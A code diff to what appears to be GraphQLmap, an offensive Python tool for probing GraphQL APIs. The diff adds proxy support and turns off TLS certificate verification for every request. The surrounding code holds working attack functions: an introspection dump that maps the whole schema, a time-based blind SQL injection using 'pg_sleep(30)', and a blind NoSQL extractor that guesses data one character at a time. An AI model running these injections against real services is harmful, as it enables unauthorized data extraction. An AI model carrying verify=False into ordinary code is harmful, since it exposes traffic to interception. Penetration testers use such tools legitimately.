@@ -6,6 +6,7 @@ import requests
 import json
 import readline
 import argparse
+import warnings
 
 cmdlist  = ["exit", "help", "dump", "sqli", "nosqli", "mutation", "$regex", "$ne", "__schema"]
 
@@ -29,14 +30,16 @@ def jq(data):
 #     for names in schema['data']['__schema']['types']:
 #         print(names)
 
+
 def dump_schema(URL, method, auth):
     payload = "fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}"
-
-    if method == 'GET':
-        r = requests.get(URL.format(payload), headers=auth)
-    else:
-        payload = '{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}'
-        r = requests.post(URL, json=json.loads(payload), headers=auth)
+    with warnings.catch_warnings():
+        warnings.filterwarnings('ignore')
+        if method == 'GET':
+            r = requests.get(URL.format(payload), headers=auth, proxies=proxy, verify=False)
+        else:
+            payload = '{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}'
+            r = requests.post(URL, json=json.loads(payload), headers=auth, proxies=proxy, verify=False)
     schema = r.json()
     print("============= [SCHEMA] ===============")
     print("e.g: \033[92mname\033[0m[\033[94mType\033[0m]: arg (\033[93mType\033[0m!)\n")
@@ -82,10 +85,12 @@ def dump_schema(URL, method, auth):
                     print("")
 
 def exec_graphql(URL, query, method, auth, only_length=0):
-    if method == "GET":
-        r = requests.get( URL.format(query), headers=auth)
-    else:
-        r = requests.post(URL, json=json.loads(query),headers=auth )
+    with warnings.catch_warnings():
+        warnings.filterwarnings('ignore')
+        if method == "GET":
+            r = requests.get( URL.format(query), headers=auth, proxies=proxy, verify=False)
+        else:
+            r = requests.post(URL, json=json.loads(query),headers=auth, proxies=proxy, verify=False)
     try:
         graphql = r.json()
         errors = graphql.get("errors")
@@ -142,12 +147,14 @@ def blind_sql(URL, method, auth):
     query = input("Query > ")
     payload = "1 AND pg_sleep(30) --"
     print("\033[92m[+] Started at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
-    if method == "GET":
-        injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
-        r = requests.get(injected, headers=auth)
-    else:
-        injected = query.replace("BLIND_PLACEHOLDER", payload)
-        r = requests.post(URL, json=json.loads(injected), headers=auth)
+    with warnings.catch_warnings():
+        warnings.filterwarnings('ignore')
+        if method == "GET":
+            injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", payload)
+            r = requests.get(injected, headers=auth, proxies=proxy, verify=False)
+        else:
+            injected = query.replace("BLIND_PLACEHOLDER", payload)
+            r = requests.post(URL, json=json.loads(injected), headers=auth, proxies=proxy, verify=False)
     print("\033[92m[+] Ended at: {}\033[0m".format(time.asctime( time.localtime(time.time()))))
 
 
@@ -163,13 +170,14 @@ def blind_nosql(URL, method, auth):
 
     while len(data) != data_size:
         for c in charset:
-            if method == "GET":
-                injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", data + c)
-                r = requests.get(injected, headers=auth)
-            else:
-                injected = query.replace("BLIND_PLACEHOLDER", data + c)
-                print(injected)
-                r = requests.post(URL, json=json.loads(injected), headers=auth)
+            with warnings.catch_warnings():
+                warnings.filterwarnings('ignore')
+                if method == "GET":
+                    injected = (URL.format(query)).replace("BLIND_PLACEHOLDER", data + c)
+                    r = requests.get(injected, headers=auth, proxies=proxy, verify=False)
+                else:
+                    injected = query.replace("BLIND_PLACEHOLDER", data + c)
+                    r = requests.post(URL, json=json.loads(injected), headers=auth, proxies=proxy, verify=False)
             if check in r.text:
                 data += c
 
@@ -205,6 +213,8 @@ def parse_args():
                         nargs='?', default='GET')
     parser.add_argument('-a', dest='auth', help='Set authentication if needed. The format must be in key:value i.e. '
                                                 'header:value', default='')
+    parser.add_argument('-p', dest='proxy', help='Set a remote or local proxy i.e. '
+                                                '127.0.0.1:8080', default='')
     results = parser.parse_args() 
     if results.url == None:
         parser.print_help()
@@ -219,7 +229,12 @@ if __name__ == "__main__":
     readline.parse_and_bind("tab: complete")
     if args.auth is not None:
         args.auth = json.loads('{"'+args.auth.split(':')[0]+'":"'+args.auth.split(':')[1]+'"}')
+    global proxy
 
+    if args.proxy:
+        proxy = dict({'http':args.proxy, 'https':args.proxy})
+    else:
+        proxy = ''
     while True:
         query = input("GraphQLmap > ")
         cmdlist.append(query)
